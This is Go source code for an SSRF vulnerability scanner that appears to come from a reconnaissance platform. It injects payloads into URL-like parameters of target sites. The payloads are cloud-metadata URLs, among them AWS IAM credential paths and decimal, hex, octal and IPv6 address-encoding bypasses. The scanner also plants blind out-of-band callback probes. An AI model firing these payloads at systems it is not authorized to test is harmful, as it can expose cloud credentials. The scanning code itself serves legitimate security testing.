package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/uuid"
	"github.com/recon-platform/internal/config"
	"github.com/recon-platform/internal/database"
	"github.com/recon-platform/internal/tools"
	"github.com/recon-platform/pkg/logger"
)

type SSRFScanner struct {
	db        *database.DB
	exec      *tools.Executor
	cfg       *config.Config
	logger    *logger.Logger
	broadcast BroadcastFunc
}

func NewSSRFScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, log *logger.Logger, broadcast BroadcastFunc) *SSRFScanner {
	return &SSRFScanner{db: db, exec: exec, cfg: cfg, logger: log, broadcast: broadcast}
}

var ssrfHTTPClient = &http.Client{
	Transport: sharedHTTPTransport,
	Timeout:   15 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

// Cloud-metadata signatures — these must be tokens that appear ONLY in the
// actual metadata RESPONSE body, never in the request URL we send. Path tokens
// like `iam/security-credentials/` and `computeMetadata/v1` were REMOVED: they
// live in our payload URL, so any endpoint that merely reflects the parameter
// (e.g. "Redirecting to http://169.254.169.254/.../iam/security-credentials/")
// would match them and produce a false "SSRF confirmed". What remains is real
// response content: the credential JSON keys and IMDS listing fields.
var ssrfMetadataSignatures = []*regexp.Regexp{
	// AWS
	regexp.MustCompile(`(?i)"AccessKeyId"\s*:`),
	regexp.MustCompile(`(?i)"SecretAccessKey"\s*:`),
	regexp.MustCompile(`(?i)"Token"\s*:\s*"[A-Za-z0-9/+]{40,}`),
	regexp.MustCompile(`(?i)ami-launch-index`),
	regexp.MustCompile(`(?i)block-device-mapping`),
	regexp.MustCompile(`(?i)instance-action`),
	regexp.MustCompile(`(?i)"ManagedPolicyArns"`),
	regexp.MustCompile(`(?i)ssh-public-keys`),
	// Azure IMDS (http://169.254.169.254/metadata/instance)
	regexp.MustCompile(`(?i)"azEnvironment"\s*:`),
	regexp.MustCompile(`(?i)"subscriptionId"\s*:`),
	regexp.MustCompile(`(?i)"vmScaleSetName"\s*:`),
	// Alibaba Cloud (http://100.100.100.200/latest/meta-data/)
	regexp.MustCompile(`(?i)owner-account-id`),
	regexp.MustCompile(`(?i)ram/security-credentials`),
	// DigitalOcean (http://169.254.169.254/metadata/v1/)
	regexp.MustCompile(`(?i)"droplet_id"\s*:`),
	regexp.MustCompile(`(?i)"interfaces"\s*:\s*{`),
	// Oracle Cloud Infrastructure (http://169.254.169.254/opc/v2/instance/)
	regexp.MustCompile(`(?i)"compartmentId"\s*:`),
	regexp.MustCompile(`(?i)"availabilityDomain"\s*:`),
}

// ssrfPayloadHostMarkers are strings that only exist because WE put the metadata
// host in the parameter. If any appears in the response, the endpoint reflected
// our payload — a genuine SSRF response (creds JSON / IMDS listing) never echoes
// the request URL. Their presence means "reflection, not SSRF" → discard.
var ssrfPayloadHostMarkers = []string{
	"169.254.169.254",
	"2852039166",
	"::ffff:169.254",
	"0251.0376.0251.0376",
	"0xa9fea9fe",
	"metadata.google.internal",
	"meta-data",
	"security-credentials",
	"computeMetadata",
	"100.100.100.200",
	"metadata/instance",
	"opc/v2/instance",
}

// responseReflectsPayload reports whether the response merely echoed our SSRF
// payload URL back (the #1 SSRF false-positive: reflecting redirect/url params).
func responseReflectsPayload(body, payloadURL string) bool {
	if body == "" {
		return false
	}
	if strings.Contains(body, payloadURL) {
		return true
	}
	lb := strings.ToLower(body)
	for _, m := range ssrfPayloadHostMarkers {
		if strings.Contains(lb, strings.ToLower(m)) {
			return true
		}
	}
	return false
}

const ssrfMaxParams = 150

// Run tests SSRF-prone parameters by pointing them at cloud-metadata endpoints
// and internal hosts, then confirming via metadata signatures in the response.
// Targeted + bounded so it stays fast even on big scopes.
func (s *SSRFScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
	logFn("info", "ssrf", "Starting SSRF checks on URL-like parameters...")

	candidates := s.selectCandidates(ctx, targetID)
	logFn("info", "ssrf", fmt.Sprintf("Selected %d SSRF-prone parameters", len(candidates)))
	if len(candidates) == 0 {
		// No in-band candidates, but blind (out-of-band) SSRF may still be planted
		// on URL-prone params whose fetch produces no visible response signal.
		s.plantBlindSSRF(ctx, targetID, logFn)
		return nil
	}

	// Metadata + internal payloads across every major cloud provider, plus
	// IP-encoding bypasses (decimal/hex/octal/IPv6) for the shared 169.254.169.254
	// link-local address that AWS/Azure/DigitalOcean/Oracle all use.
	payloads := []struct{ url, note string }{
		{"http://169.254.169.254/latest/meta-data/", "AWS IMDS"},
		{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds"},
		{"http://metadata.google.internal/computeMetadata/v1/instance/", "GCP metadata"},
		{"http://2852039166/latest/meta-data/", "AWS IMDS (decimal-IP bypass)"},
		{"http://[::ffff:169.254.169.254]/latest/meta-data/", "AWS IMDS (IPv6 bypass)"},
		{"http://0xa9fea9fe/latest/meta-data/", "AWS IMDS (hex-IP bypass)"},
		{"http://0251.0376.0251.0376/latest/meta-data/", "AWS IMDS (octal-IP bypass)"},
		{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"},
		{"http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"},
		{"http://169.254.169.254/metadata/v1/", "DigitalOcean metadata"},
		{"http://169.254.169.254/opc/v2/instance/", "Oracle Cloud (OCI) metadata"},
	}

	sem := make(chan struct{}, 8)
	var wg sync.WaitGroup
	var found atomic.Int64

	for _, c := range candidates {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(rawURL, param string) {
			defer wg.Done()
			defer func() { <-sem }()

			// Baseline: the normal response for this endpoint. A signature that
			// already appears here is NOT from our injection — skip it. This
			// kills false positives from APIs whose normal JSON happens to
			// contain a metadata-like token.
			baseline := s.fetch(ctx, injectParam(rawURL, param, "recon-baseline-x"), "")

			for _, pl := range payloads {
				body := s.fetch(ctx, injectParam(rawURL, param, pl.url), pl.url)
				if body == "" {
					continue
				}
				// FALSE-POSITIVE GUARD: if the endpoint just echoed our payload URL
				// back into the response, this is reflection, not SSRF. A real
				// metadata fetch returns creds JSON / a field listing that never
				// contains the request URL or the metadata host.
				if responseReflectsPayload(body, pl.url) {
					continue
				}
				for _, sig := range ssrfMetadataSignatures {
					if sig.MatchString(body) && !sig.MatchString(baseline) {
						// Confirm once more to rule out a transient/dynamic body.
						body2 := s.fetch(ctx, injectParam(rawURL, param, pl.url), pl.url)
						if responseReflectsPayload(body2, pl.url) || !sig.MatchString(body2) {
							continue
						}
						ev := fmt.Sprintf("Cloud-metadata response content (%s) returned via %s, absent from baseline and not a reflection of the payload URL — confirmed twice", sig.String(), pl.note)
						s.storeConf(targetID, "ssrf", "critical", rawURL, param, pl.url, ev, ConfPoC)
						found.Add(1)
						logFn("warn", "ssrf", fmt.Sprintf("SSRF CONFIRMED: %s param=%s → %s", rawURL, param, pl.note))
						s.notify(targetID, rawURL, param)
						return
					}
				}
			}
		}(c.url, c.param)
	}
	wg.Wait()

	// Blind (out-of-band) SSRF — the SSRF objective OWNS its blind confirmation via
	// the shared OOB capability, so a single-objective SSRF scan gets full coverage
	// without pulling in a multi-class OAST module.
	s.plantBlindSSRF(ctx, targetID, logFn)

	logFn("info", "ssrf", fmt.Sprintf("SSRF check done. Found %d.", found.Load()))
	return nil
}

// plantBlindSSRF plants out-of-band SSRF probes over every URL-prone insertion
// point (no-op without a configured callback URL). A callback proves the server
// fetched our host — reported as a blind_ssrf finding via RecordOOBHit. This is
// the SSRF detector owning its own blind payloads + confirmation.
func (s *SSRFScanner) plantBlindSSRF(ctx context.Context, targetID string, logFn LogFunc) {
	o, ok := newOOBCapability(s.cfg)
	if !ok {
		return
	}
	points := loadInsertionPoints(ctx, s.db, targetID, s.cfg.URLLimit())
	if len(points) == 0 {
		return
	}
	auth := loadAuthHeaders(ctx, s.db, targetID)
	n := o.plantClass(ctx, s.db, targetID, points, auth, "ssrf",
		func(ip insertionPoint) bool { return paramProneTo(ClassSSRF, ip.Param, "") },
		func(cb string) []string { return ssrfOOBPayloads(cb, o.callbackHost) })
	if n > 0 {
		logFn("info", "ssrf", fmt.Sprintf("Planted %d blind-SSRF OOB probe(s); execution reported via callback.", n))
	}
}

type ssrfCandidate struct{ url, param string }

func (s *SSRFScanner) selectCandidates(ctx context.Context, targetID string) []ssrfCandidate {
	rows, err := s.db.QueryContext(ctx, `SELECT DISTINCT url, parameter, COALESCE(value,'') FROM parameters WHERE target_id = ?`, targetID)
	if err != nil {
		return nil
	}
	defer rows.Close()
	seen := make(map[string]bool)
	var out []ssrfCandidate
	for rows.Next() {
		var u, param, val string
		if err := rows.Scan(&u, &param, &val); err != nil {
			continue
		}
		// Route via the unified param classifier: name tokens (redirect_url,
		// returnUrl, image_url…) + value heuristic (a value that IS a URL).
		if !paramProneTo(ClassSSRF, param, val) {
			continue
		}
		parsed, err := url.Parse(u)
		if err != nil {
			continue
		}
		key := parsed.Host + parsed.Path + "?" + param
		if seen[key] {
			continue
		}
		seen[key] = true
		out = append(out, ssrfCandidate{u, param})
		if len(out) >= ssrfMaxParams {
			break
		}
	}
	return out
}

// fetch sends the request. For GCP metadata the Metadata-Flavor header is
// required, so we set it whenever the payload targets metadata.google.internal.
func (s *SSRFScanner) fetch(ctx context.Context, u, payload string) string {
	reqCtx, cancel := context.WithTimeout(ctx, 12*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, "GET", u, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")
	if strings.Contains(payload, "metadata.google.internal") {
		req.Header.Set("Metadata-Flavor", "Google")
	}
	if strings.Contains(payload, "/metadata/instance") {
		req.Header.Set("Metadata", "true") // Azure IMDS requires this exact header
	}
	if strings.Contains(payload, "/opc/v2/instance") {
		req.Header.Set("Authorization", "Bearer Oracle") // OCI IMDS v2 requires this exact header
	}
	resp, err := ssrfHTTPClient.Do(req)
	if err != nil {
		return ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	resp.Body.Close()
	return string(body)
}

func (s *SSRFScanner) storeConf(targetID, vulnType, severity, rawURL, param, payload, evidence string, confidence int) {
	status := StatusFinding
	if confidence < ConfEvidence {
		status = StatusCandidate
	}
	id := uuid.New().String()
	_, _ = s.db.Exec(`
		INSERT INTO vuln_findings (id, target_id, type, severity, url, parameter, payload, evidence, confidence, status)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(target_id, type, url, parameter) DO UPDATE SET
			severity = excluded.severity, payload = excluded.payload, evidence = excluded.evidence,
			confidence = excluded.confidence, status = excluded.status
	`, id, targetID, vulnType, severity, rawURL, param, payload, evidence, confidence, status)
}

func (s *SSRFScanner) notify(targetID, rawURL, param string) {
	if s.broadcast != nil {
		s.broadcast("new_vuln_finding", map[string]any{
			"target_id": targetID, "type": "ssrf", "url": rawURL, "parameter": param,
		})
	}
}
